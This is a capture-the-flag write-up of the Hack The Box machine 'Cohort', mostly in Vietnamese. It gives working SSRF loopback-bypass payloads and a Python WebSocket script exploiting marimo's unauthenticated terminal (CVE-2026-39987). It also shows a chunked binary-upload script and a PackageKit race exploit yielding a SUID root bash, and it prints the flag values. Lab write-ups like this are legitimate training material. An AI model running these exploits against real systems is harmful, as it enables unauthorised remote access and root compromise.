---
hidden: true
---

# Cohort

## HTB — Cohort: Full Walkthrough (SSRF → Marimo Pre-Auth RCE → PackageKit LPE to Root)

* **Box**: Cohort (Hack The Box) — Linux, Easy
* **IP**: 10.129.4.107 — **Domain**: cohort.htb
* **Flags**: User `0707e3182d3249315ad5de05a4e94db2` — Root `12196c46fff9305e3f0a2493174cd26d`
* **Attack chain**:
  1. SSRF trong form "Validate source" (`POST /api/validate`)
  2. Bypass filter loopback → quét dịch vụ nội bộ
  3. Phát hiện vhost ẩn qua `GET /status` → proxy marimo (`nb-1be3782a8afd3ad5.cohort.htb` → 127.0.0.1:8888)
  4. **CVE-2026-39987** — marimo `/terminal/ws` pre-auth RCE → shell user `marimo` → user flag
  5. **CVE-2026-41651 (Pack2TheRoot)** — PackageKit TOCTOU race → SUID bash → root flag

***

### 1. Recon & Port Scan

```bash
┌──(kali)─[~]
└─$ nmap -sT -sC -sV --min-rate 5000 10.129.4.107
```

```
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH (Ubuntu)
80/tcp   open  http     nginx/1.24.0 (Ubuntu)
443/tcp  open  https    nginx/1.24.0 (Ubuntu)
5000/tcp open  http     Flask API (internal: insights-api)
8888/tcp open  http     marimo notebook (localhost-only — không thể truy cập trực tiếp từ ngoài)
```

Thêm domain vào `/etc/hosts`:

```bash
echo "10.129.4.107 cohort.htb" | sudo tee -a /etc/hosts
```

***

### 2. Web App — Phát hiện SSRF

Trang chủ là landing page tĩnh "Cohort Analytics". Trang `/portal.html` ("Client Insights") có form **Validate source**: nhập URL, server tự fetch. Đó là SSRF.

Phân tích JavaScript (bị obfuscate bằng obfuscator.io + **AES-GCM encrypt client-side**):

* File `assets/app.js` chứa ciphertext AES-GCM, key và IV nhúng trong code.
* Giải mã bằng Node (key `NnB02s8+...`, IV `fSc+LTJkAMJgRJbQ`, ciphertext từ object `iKmTx`):

```javascript
// extract_key_iv.js — trích xuất và decrypt payload ẩn trong app.js
const crypto = require('crypto');
const fs = require('fs');
const code = fs.readFileSync('/tmp/app_full.js', 'utf8');
const key = Buffer.from('NnB02s8+X30K3WtHOjWy4qXJ2F2ihnnSImL6X4GRyZQ=', 'base64');
const iv  = Buffer.from('fSc+LTJkAMJgRJbQ', 'base64');
// parse state machine: quét giá trị của key 'iKmTx' (chuỗi base64 chia nhỏ nối bởi + và (...))
const idx = code.indexOf("'iKmTx':");
let i = idx + 8, b64 = '';
while (i < code.length) {
  const c = code[i];
  if (c === '"') { i++; while (code[i] !== '"') { b64 += code[i]; i++; } i++; }
  else if (c === '+' || c === '(' || c === ')' || c === ' ') i++;
  else break;
}
const ct = Buffer.from(b64, 'base64');
const d = crypto.createDecipheriv('aes-256-gcm', key, iv);
d.setAuthTag(ct.subarray(ct.length - 16));
const out = Buffer.concat([d.update(ct.subarray(0, ct.length - 16)), d.final()]);
fs.writeFileSync('/tmp/payload.js', out.toString('utf8'));
```

Payload giải mã được là source thật của frontend — **xác nhận SSRF chỉ gửi GET**, không có header/method do người dùng kiểm soát:

```javascript
fetch("/api/validate", {
  method: "POST",
  headers: { "Content-Type": "application/json", "Accept": "application/json" },
  body: JSON.stringify({ url: url, format: document.getElementById("format").value })
})
```

***

### 3. Confirm + Bypass SSRF Filter

Gửi URL external về listener của mình → box fetch được → SSRF xác nhận.

```bash
# Listener: python3 -m http.server 8000 (kali IP: 10.10.15.135)
$ curl -sk -X POST https://cohort.htb/api/validate -H "Content-Type: application/json" \
  -d '{"url":"http://10.10.15.135:8000/ssrf-test","format":"csv"}'
```

Backend chặn loopback/private IP:

```
{"ok": false, "message": "Internal or loopback addresses are not permitted."}
```

Bypass bằng các dạng encode IP (backend parse bằng thư viện chuẩn, filter chỉ match literal):

| URL (value của `url`)     | Kết quả                                              |
| ------------------------- | ---------------------------------------------------- |
| `http://127.0.0.1:8888/`  | ❌ "Internal or loopback addresses are not permitted" |
| `http://localhost:8888/`  | ❌ bị chặn                                            |
| `http://0x7f000001:8888/` | ✅ **hoạt động** (hex của 127.0.0.1)                  |
| `http://2130706433:8888/` | ✅ hoạt động (decimal)                                |
| `http://0177.0.0.1:8888/` | ✅ hoạt động (octal)                                  |
| `http://127.1:8888/`      | ✅ hoạt động (short form)                             |
| `http://0:80/`            | ✅ hoạt động (0.0.0.0 → nginx)                        |

```bash
$ curl -sk -X POST https://cohort.htb/api/validate -H "Content-Type: application/json" \
  -d '{"url":"http://0x7f000001:8888/health","format":"csv"}'
{"ok": true, "fetched_status": 200, "content_type": "application/json",
 "preview": "{\"status\":\"healthy\"}", "message": "Source reachable."}
```

`file://` bị chặn (`"Only http and https sources are supported."`), egress internet bị chặn (504).

***

### 4. Internal Port Scan qua SSRF

Dùng chính endpoint validate để quét các port trên loopback (mỗi request = 1 probe):

```bash
for p in 22 80 443 5432 3306 27017 6379 8000 8081 8888 9000 5000 ...; do
  curl -sk -X POST https://cohort.htb/api/validate -H "Content-Type: application/json" \
    -d "{\"url\":\"http://0x7f000001:$p/\",\"format\":\"csv\"}" | head -c 120
  echo " <- port $p"
done
```

Kết quả: chỉ mở `80` (nginx), `443`, `5000`, `8888` (phần còn lại Connection refused).

| Port     | Dịch vụ                   | Ghi chú                                                                                                                                           |
| -------- | ------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------- |
| 80 / 443 | nginx                     | web chính                                                                                                                                         |
| 5000     | `cohort-insights` (Flask) | `GET /health` → `{"ok": true, "service": "cohort-insights"}`; mọi path khác → 405                                                                 |
| 8888     | **marimo 0.20.4**         | notebook Python; `GET /health` → `{"status":"healthy"}`, `GET /api/version` → `"0.20.4"`, `GET /api/status` → 401 `Authorization header required` |

Marimo có login (`POST /auth/login`, field `password`) — nhưng SSRF chỉ GET, không POST được, không set được headers (đã fuzz mọi field JSON: `method`, `headers`, `auth`... đều bị bỏ qua).

***

### 5. Phát hiện vhost ẩn qua `GET /status`

Fuzz path trên nginx qua SSRF. Path `/status` (port 80) trả về **bảng cấu hình upstream của nginx**:

```bash
$ curl -sk -X POST https://cohort.htb/api/validate -H "Content-Type: application/json" \
  -d '{"url":"http://0x7f000001:80/status","format":"csv"}'
```

```json
{"service":"cohort-edge","status":"ok","generated_by":"nginx","upstreams":[
  {"name":"marketing","host":"cohort.htb","root":"/var/www/cohort"},
  {"name":"insights-api","host":"cohort.htb","path":"/api/","target":"127.0.0.1:5000"},
  {"name":"notebooks","host":"nb-1be3782a8afd3ad5.cohort.htb","target":"127.0.0.1:8888",
   "note":"internal analyst workspace, not for ext..."}
]}
```

→ **Vhost `nb-1be3782a8afd3ad5.cohort.htb`** proxy thẳng tới marimo 127.0.0.1:8888. Marimo giờ truy cập được từ ngoài qua vhost!

```bash
echo "10.129.4.107 nb-1be3782a8afd3ad5.cohort.htb" | sudo tee -a /etc/hosts

$ curl -sk -H "Host: nb-1be3782a8afd3ad5.cohort.htb" https://cohort.htb/api/version
0.20.4
```

***

### 6. CVE-2026-39987 — Marimo Pre-Auth RCE qua WebSocket

marimo 0.20.4 nằm trong dải bị ảnh hưởng (`<= 0.20.4`). **CVE-2026-39987**: endpoint WebSocket `/terminal/ws` (terminal tích hợp) **thiếu hoàn toàn kiểm tra auth** trong khi `/ws` thì có — attacker không cần token vẫn mở được PTY shell đầy đủ.

Verify handshake (HTTP 101 = accept, không cần auth):

```bash
$ curl -sk -D - -H "Host: nb-1be3782a8afd3ad5.cohort.htb" \
  -H "Upgrade: websocket" -H "Connection: Upgrade" \
  -H "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==" -H "Sec-WebSocket-Version: 13" \
  https://10.129.4.107/terminal/ws

HTTP/1.1 101 Switching Protocols
Server: nginx/1.24.0 (Ubuntu)
Connection: upgrade
Upgrade: websocket
Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=
```

(So sánh: `/ws` trả 400/401 — chứng minh auth bypass.)

#### Script exploit — terminal shell qua WebSocket

```python
# exploit_terminal.py — CVE-2026-39987: PTY shell qua /terminal/ws
import asyncio, websockets, ssl, sys

HOST = "wss://nb-1be3782a8afd3ad5.cohort.htb/terminal/ws"

async def run(cmd_lines):
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    async with websockets.connect(HOST, ssl=ctx, max_size=2**26) as ws:
        for line in cmd_lines:
            await ws.send(line + "\r")
            await asyncio.sleep(0.3)
            try:
                out = await asyncio.wait_for(ws.recv(), timeout=2)
                print(out, end="")
            except asyncio.TimeoutError:
                pass
        for _ in range(10):
            try:
                out = await asyncio.wait_for(ws.recv(), timeout=1)
                print(out, end="")
            except asyncio.TimeoutError:
                break

if __name__ == "__main__":
    cmds = sys.argv[1:] or ["id", "whoami", "hostname"]
    asyncio.run(run(cmds))
```

Chạy:

```bash
$ python3 exploit_terminal.py "id" "uname -a"
marimo@cohort:~$ id
uid=1000(marimo) gid=1000(marimo) groups=1000(marimo)
marimo@cohort:~$ uname -a
Linux cohort 6.8.0-136-generic #136-Ubuntu SMP PREEMPT_DYNAMIC Wed Jul  1 21:53:05 UTC 2026 x86_64
```

**→ Shell as `marimo` (user 1000).**

***

### 7. User Flag

```bash
$ python3 exploit_terminal.py "cat /home/marimo/user.txt"
marimo@cohort:~$ cat /home/marimo/user.txt
0707e3182d3249315ad5de05a4e94db2
```

#### USER FLAG: `0707e3182d3249315ad5de05a4e94db2`

***

### 8. LPE — CVE-2026-41651 "Pack2TheRoot" (PackageKit TOCTOU)

Enumeration thấy PackageKit đang cài (dải lỗi 1.0.2 → 1.3.4):

```bash
$ python3 exploit_terminal.py "dpkg -l | grep -i packagekit"
ii  packagekit  1.2.8-2ubuntu1.2  ...  Provides a package management service
ii  packagekit-tools  1.2.8-2ubuntu1.2
```

**CVE-2026-41651**: race TOCTOU trong `InstallFiles()` của packagekitd. Ba lỗi nối chuỗi:

1. **Bug 1 — ghi đè flag không điều kiện** (`pk-transaction.c:4036`): `InstallFiles()` ghi flag + path người dùng gửi lên transaction **đang chạy** mà không kiểm tra trạng thái.
2. **Bug 2 — chuyển trạng thái lùi bị bỏ qua âm thầm**: state machine nhận `WAITING_FOR_AUTH` khi đang `READY` → bỏ qua, state giữ nguyên, nhưng flag đã bị ghi đè.
3. **Bug 3 — đọc flag muộn** (`pk_transaction_run()`): backend đọc `cached_transaction_flags` ở thời điểm **dispatch** (GLib idle), không phải lúc authorize.
4. **Bonus — `SIMULATE` bỏ qua polkit**: gửi flag `PK_TRANSACTION_FLAG_SIMULATE` (bit 0x4) → polkit không được gọi.

**Kịch bản khai thác** (không cần thắng race — chỉ cần gửi 2 request async trước khi idle chạy):

* Tạo transaction → `InstallFiles(SIMULATE, dummy.deb)` → polkit bị bỏ qua, state = READY, idle dispatch được xếp hàng.
* Ngay lập tức `InstallFiles(NONE, payload.deb)` → **ghi đè** path bằng payload (Bug 1), state rejection âm thầm (Bug 2).
* Idle chạy → backend đọc flag = NONE + path = payload.deb → **dpkg cài payload với quyền root** (Bug 3).
* `postinst` của payload: `chmod +s` lên bản copy của `/bin/bash` → `/tmp/.suid_bash`.

#### Chuẩn bị exploit

Lấy PoC (compile cần `libglib2.0-dev`):

```bash
$ git clone https://github.com/Vozec/CVE-2026-41651 /tmp/opencode/pack2root
$ cd /tmp/opencode/pack2root && make
$ file cve-2026-41651
cve-2026-41651: ELF 64-bit LSB pie executable, x86-64, dynamically linked, ... 26.9K
```

#### Upload lên box qua WebSocket PTY

Box không có egress trực tiếp tới mình; dễ nhất là bơm base64 chia nhỏ qua shell WebSocket (mỗi lần một dòng `echo -n ... >> file`):

```python
# upload.py — bơm file nhị phân lên target qua PTY WebSocket
import asyncio, websockets, ssl, base64

HOST  = "wss://nb-1be3782a8afd3ad5.cohort.htb/terminal/ws"
FILE  = "/tmp/opencode/pack2root/cve-2026-41651"
CHUNK = 600

async def send_cmd(ws, line, wait=0.35):
    await ws.send(line + "\r")
    await asyncio.sleep(wait)
    out = []
    try:
        while True:
            d = await asyncio.wait_for(ws.recv(), timeout=0.5)
            out.append(d)
    except asyncio.TimeoutError:
        pass
    return "".join(out)

async def main():
    b64 = base64.b64encode(open(FILE, "rb").read()).decode()
    ctx = ssl.create_default_context()
    ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
    async with websockets.connect(HOST, ssl=ctx, max_size=2**27) as ws:
        await send_cmd(ws, "stty -echo 2>/dev/null; rm -f /tmp/xpl.b64")
        for i in range(0, len(b64), CHUNK):
            part = b64[i:i+CHUNK]
            await send_cmd(ws, f"echo -n '{part}' >> /tmp/xpl.b64", wait=0.15)
        out = await send_cmd(ws,
            "base64 -d /tmp/xpl.b64 > /tmp/xpl && chmod +x /tmp/xpl && echo UPLOAD_OK && ls -la /tmp/xpl",
            wait=1.5)
        print("FINAL:", out[-400:])

asyncio.run(main())
```

Output:

```
chunk 60/61
UPLOAD_OK
-rwxr-xr-x 1 marimo marimo 27544 Aug  4 07:52 /tmp/xpl
```

#### Chạy exploit

Chạy nền (exploit poll tới 120 giây), đợi, rồi kiểm tra SUID bash:

```bash
$ python3 exploit_terminal.py "cd /tmp && nohup ./xpl > /tmp/xpl.log 2>&1 &"
$ sleep 90
$ python3 exploit_terminal.py "cat /tmp/xpl.log; /tmp/.suid_bash -p -c 'id; cat /root/root.txt'"
```

Output:

```
 CVE-2026-41651 — PackageKit TOCTOU LPE
[*] Step 1 : InstallFiles(SIMULATE=0x4, dummy) [async]
[*] Step 2 : InstallFiles(NONE=0x0, payload) [async]
[*] Waiting for dispatch (30 s max)...
[!] PK error 48: Failed to obtain authentication.   <- polkit từ chối call 2, nhưng không quan trọng
[*] Finished (exit=2, 0 ms)
[*] Polling for payload (120 s max)...
[*] t+1s: payload=exists dpkg_lock=free suid=FOUND
uid=1000(marimo) gid=1000(marimo) euid=0(root) groups=1000(marimo)

[+] SUCCESS — SUID bash at t+0ms
-rwsr-xr-x 1 root root 1446024 Aug  4 07:52 /tmp/.suid_bash
uid=1000(marimo) gid=1000(marimo) euid=0(root) groups=1000(marimo)
12196c46fff9305e3f0a2493174cd26d
```

Ghi chú: packagekitd crash (assertion `emitted_finished`) sau khi cài — side-effect DoS đã biết, daemon tự restart bởi systemd; SUID bash đã có trên disk trước khi crash nên leo quyền vẫn thành công.

***

### 9. Root Flag

```bash
marimo@cohort:~$ /tmp/.suid_bash -p -c 'cat /root/root.txt'
12196c46fff9305e3f0a2493174cd26d
```

#### ROOT FLAG: `12196c46fff9305e3f0a2493174cd26d`

***

### Tóm tắt chuỗi tấn công

| Bước | Kỹ thuật                                                               | Kết quả                                            |
| ---- | ---------------------------------------------------------------------- | -------------------------------------------------- |
| 1    | SSRF `POST /api/validate` (form Validate source)                       | fetch nội bộ                                       |
| 2    | Bypass loopback filter: `0x7f000001`, `127.1`, `2130706433`, `0`       | truy cập 127.0.0.1                                 |
| 3    | Port scan qua SSRF                                                     | 5000 (cohort-insights), 8888 (marimo 0.20.4)       |
| 4    | `GET /status` trên nginx                                               | lộ vhost `nb-1be3782a8afd3ad5.cohort.htb` → marimo |
| 5    | CVE-2026-39987 `/terminal/ws` pre-auth WebSocket                       | PTY shell user `marimo`                            |
| 6    | CVE-2026-41651 Pack2TheRoot (PackageKit TOCTOU, 2x InstallFiles async) | SUID bash → root                                   |
